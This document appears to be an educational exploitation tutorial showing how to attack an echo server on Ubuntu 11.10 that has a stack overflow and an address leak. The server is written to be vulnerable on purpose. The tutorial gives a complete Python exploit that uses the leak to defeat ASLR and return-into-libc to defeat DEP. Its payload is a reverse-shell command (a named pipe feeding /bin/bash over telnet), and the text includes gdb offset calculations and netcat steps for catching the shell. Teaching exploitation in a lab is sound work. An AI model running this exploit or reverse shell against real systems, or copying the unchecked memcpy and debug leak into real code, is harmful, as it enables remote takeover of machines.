# Example 1 - Echo server with info leak #

Here we present an example of stack overflow exploitation using an information leak to bypass ASLR (and DEP) on Ubuntu 11.10 32 bits. The vulnerable program is an echo server that keeps listening to client connections on port 4000 and when a client connects, receives some data and sends the same data back.

## Echo server ##

The echo server code is shown below:

```
/* Echo server with info leak
 * Compile with:
 *     gcc -fno-stack-protector -g server.c -o server -ldl
 */

#include <netinet/in.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <dlfcn.h>

#define MAXRECVLEN 500
#define PORT 4000

void *libc;

void process_input(char *inbuf, int len, int clientfd) {
    char localbuf[40];

    if (!strcmp(inbuf, "debug\n")) {
        sprintf(localbuf, "localbuf %p\nsend() %p\n", localbuf, 
                dlsym(libc, "send"));
    } else {
        memcpy(localbuf, inbuf, len);
    }

    send(clientfd, localbuf, strlen(localbuf), 0);
}

int main() {
    int sockfd, clientfd, clientlen, len;
    char inbuf[MAXRECVLEN + 1];
    struct sockaddr_in myaddr, clientaddr;

    libc = dlopen("libc.so", RTLD_LAZY);

    sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

    myaddr.sin_family = AF_INET;
    myaddr.sin_addr.s_addr = htonl(INADDR_ANY);
    myaddr.sin_port = htons(PORT);

    bind(sockfd, (struct sockaddr *)&myaddr, sizeof(myaddr));
    listen(sockfd, 5);

    clientlen = sizeof(clientaddr);

    while (1) {
        clientfd = accept(sockfd, (struct sockaddr *)&clientaddr, &clientlen);
        
        len = recv(clientfd, inbuf, MAXRECVLEN, 0);
        inbuf[len] = '\0';
        
        process_input(inbuf, len + 1, clientfd);
        
        close(clientfd);
    }
    
    close(sockfd);
    dlclose(libc);

    return 0;
}

```

The stack overflow occurs at the _process\_input()_ function, when the data received from the client is copied into _localbuf_ via _memcpy()_. The information leak also occurs at the same function, when the server recognizes the special string "debug" and returns two internal addresses: the address of _localbuf_, which is a stack address, and the address of _send()_, which is an address of a function from the dynamic loaded library _libc_.

## Information leak to defeat ASLR ##

Ubuntu 11.10 comes with ASLR and DEP mitigations enabled by default. There are some known bypass techniques that can be used to overcome these mitigations, such as brute-force and information leaks for ASLR and _return-into-libc_ and _return-oriented programming_ for DEP. In this example, we use the information leak caused by the "debug" input to obtain addresses to be used in a _return-into-libc_ attack.

We can see the randomized addresses by running the server twice and issuing the "debug" command on a client. To do it, run the following commands in a terminal to start the server:

```
$ gcc -fno-stack-protector -g server.c -o server -ldl
$ ./server
```

In a second terminal, run _netcat_ and send "debug":

```
$ nc localhost 4000
debug
localbuf 0xbfc663f8
send() 0xc238f0
```

Now finish the server and restart it:

```
$ ./server
```

And send the "debug" string again:

```
$ nc localhost 4000
debug
localbuf 0xbfbe77f8
send() 0xaec8f0
```

So, we can see that in each run both addresses are different. To build the exploit, we take advantage of this information leak in the following manner: the address of the _send()_ function is used to calculate the address of _system()_ and _exit()_ functions that are also present in _libc_ and the stack address is used to calculate the address of the argument to _system()_.

## The exploit ##

A Python script that takes this approach to exploit the server is shown below:

```
# Exploit for buggy echo server running on Ubuntu 11.10 32 bits
# with DEP and ASLR enabled
#
# Run "nc -vv -l 8080" in a second terminal before running this script
# to receive the connect-back shell

import socket
import struct

c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
c.connect(('localhost', 4000))

buf = "debug\n"
c.send(buf)
buf = c.recv(512)
leaked_stack_addr = int(buf[9:buf.find('\n')], 16)
leaked_send_addr = int(buf[27:buf.rfind('\n')], 16)
c.close()

c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
c.connect(('localhost', 4000))

command = ('rm -f backpipe && mknod backpipe p &&'
           'telnet localhost 8080 0<backpipe | /bin/bash 1>backpipe\x00')
command_addr = leaked_stack_addr + 64
system_addr = leaked_send_addr - 0x96dd0  # system()
system_ret_addr = system_addr - 0xa140 # exit()
buf = ('A' * 52 + 
       struct.pack('I', system_addr) +
       struct.pack('I', system_ret_addr) +
       struct.pack('I', command_addr) +
       command)
c.send(buf)

c.close()
```

The exploit makes two connections to the echo server. In the first one, it sends the "debug" string to receive the two leaked addresses. Then, it makes the second connection to send the malicious data to create a connect-back shell.

The malicious data is composed of:

  * 52 A's to fill the stack until before the return pointer
  * the address of _system()_ calculated from the leaked _send()_ address, that overwrites the return pointer
  * the address of _exit()_ calculated from the leaked _send()_ address
  * the address of the string containing the command to create the connect-back shell, calculated from the leaked _localbuf_ address
  * the string containing the command to create the connect-back shell

To calculate the addresses of _system()_ and _exit()_ from the leaked _send()_ address, we need to calculate the offsets first. So, we load _gdb_, set a breakpoint on _main()_, run the server and issue some commands to get the addresses of _send()_, _system()_ and _exit()_, as follows:

```
$ gdb --quiet ./server 
Reading symbols from /home/xxx/example1/server...done.
(gdb) b main
Breakpoint 1 at 0x8048754: file server.c, line 35.
(gdb) run
Starting program: /home/xxx/example1/server 

Breakpoint 1, main () at server.c:35
35	    libc = dlopen("libc.so", RTLD_LAZY);
(gdb) p send
$1 = {<text variable, no debug info>} 0x2098f0 <send>
(gdb) p system
$2 = {<text variable, no debug info>} 0x172b20 <system>
(gdb) p exit
$3 = {<text variable, no debug info>} 0x1689e0 <exit>
(gdb) 
```

After obtaining these addresses, we calculate the offsets as follows:

```
system_send_offset = system_addr - send_addr = 0x172b20 - 0x2098f0 = - 0x96dd0
exit_system_offset = exit_addr - system_addr = 0x1689e0 - 0x172b20 = - 0xa140
```

With these offsets we can calculate the _system()_ and _exit()_ addresses right from the the leaked _send()_ address.

To calculate the address of the string containing the argument to _system()_, we just add the size of the data we send before such string to the leaked stack address, so:

```
command_addr = leaked_stack_addr + 52 (AAA...) + 4 (system_addr) + 4 (system_ret_addr) + 4 (command_addr)
```

When the RET instruction of _process\_input()_ is processed, it will jump to the _system()_ function, execute the malicious command and return to the _exit()_ function.

## Running the exploit ##

We can run the exploit and execute commands on the server with the following steps.

First, run the server in a terminal:

```
$ ./server
```

Second, start _netcat_ in listening mode on port 8080 to receive the connect-back shell:

```
$ nc -vv -l 8080
```

Third, run the exploit in a third terminal:

```
$ python exploit.py
```

Finally, return to the _netcat_ terminal and send some commands:

```
$ nc -vv -l 8080
Connection from 127.0.0.1 port 8080 [tcp/http-alt] accepted
uname -a
Linux xxx-VirtualBox 3.0.0-12-generic #20-Ubuntu SMP Fri Oct 7 14:50:42 UTC 2011 i686 athlon i386 GNU/Linux
```

The files used here are available at Downloads page.